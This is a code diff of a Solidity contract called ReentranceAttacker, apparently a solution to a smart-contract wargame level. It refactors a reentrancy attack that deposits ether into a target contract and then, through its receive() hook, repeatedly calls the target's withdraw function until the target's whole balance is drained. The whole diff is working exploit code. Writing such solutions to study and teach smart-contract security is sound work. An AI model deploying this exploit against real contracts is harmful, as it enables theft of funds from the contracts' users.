@@ -7,31 +7,28 @@ interface IReentrance {
 }
 
 contract ReentranceAttacker {
-  address reentrance;
-  uint valueToExtract;
-  uint increment;
+  IReentrance reentrance;
+  uint256 increment;
 
   event Amount(string _msg, uint _amount);
   event Msg(string _msg);
 
   constructor(address _address) {
-    reentrance = _address;
+    reentrance = IReentrance(_address);
   }
 
-  function attack(uint _valueToExtract) public payable {
+  function attack() public payable {
     increment = msg.value;
     emit Amount("donate", increment);
-    valueToExtract = _valueToExtract;
-    IReentrance(reentrance).donate{ value: increment }(address(this));
+    reentrance.donate{ value: increment }(address(this));
     emit Amount("withdraw", increment);
-    IReentrance(reentrance).withdraw(increment);
+    withdraw();
   }
 
-  receive() external payable {
-    emit Amount("receive", msg.value);
-    uint bal = address(reentrance).balance;
+  function withdraw() private {
+    uint256 bal = address(reentrance).balance;
     emit Amount("current balance", bal);
-    uint amountToWithdraw;
+    uint256 amountToWithdraw;
     if (bal > 0) {
       if (bal < increment) {
         amountToWithdraw = bal;
@@ -39,11 +36,15 @@ contract ReentranceAttacker {
         amountToWithdraw = increment;
       }
       emit Amount("reentrantly withdrawing", amountToWithdraw);
-      IReentrance(reentrance).withdraw(amountToWithdraw);
+      reentrance.withdraw(amountToWithdraw);
     } else {
       emit Msg("Coffers are emptied!");
     }
 
+  }
+
+  receive() external payable {
+    withdraw();
   }
 
 }
